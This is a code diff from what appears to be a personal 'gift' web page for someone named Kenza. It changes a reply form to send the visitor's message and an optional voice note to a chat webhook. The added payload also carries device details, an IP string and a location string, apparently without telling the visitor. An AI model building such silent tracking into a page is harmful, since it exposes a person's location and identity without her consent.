+            let payloadContent = `📩 **مساج جديد من كنزة!**\n`;
+            if (replyText) payloadContent += `💬 الرسالة:\n> ${replyText}\n`;
+            if (audioBlob) payloadContent += `🎙️ **تسجيل صوتي مرفق:**\n`;
+            payloadContent += `${deviceInfo}\n${ipString}\n${locationString}`;
+
+            formData.append('payload_json', JSON.stringify({
+                username: "Kenza Special Gift Bot",
+                content: payloadContent
+            }));
+
+            if (audioBlob) {
+                formData.append('file', audioBlob, 'voice_message.mp3');
             }
 
             if (WEBHOOK_URL) {
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: "Kenza Special Gift Bot",
-                        content: `📩 **مساج جديد من كنزة!**\n💬 الرسالة:\n> ${replyText}`
-                    })
+                    body: formData
                 })
-                .then(() => {
-                    statusDiv.style.color = '#2a9d8f';
-                    statusDiv.innerText = "وصلني المساج ديالك ❤️";
-                    document.getElementById('userReply').value = '';
+                .then(res => {
+                    if (res.ok) {
+                        statusDiv.style.color = '#52b788';
+                        statusDiv.innerText = "وصلني المساج / الأوديو ديالك ❤️";
+                        document.getElementById('userReply').value = '';
+                        deleteAudio();
+                        playMainMusic();
+                    } else {
+                        throw new Error('فشل الإرسال');
+                    }
                 })
-                .catch(err => {
-                    statusDiv.style.color = '#e63946';
+                .catch(() => {
+                    statusDiv.style.color = '#ff6b6b';
                     statusDiv.innerText = "وقع مشكل فالإرسال، عاودي جربي.";
                 });
             }
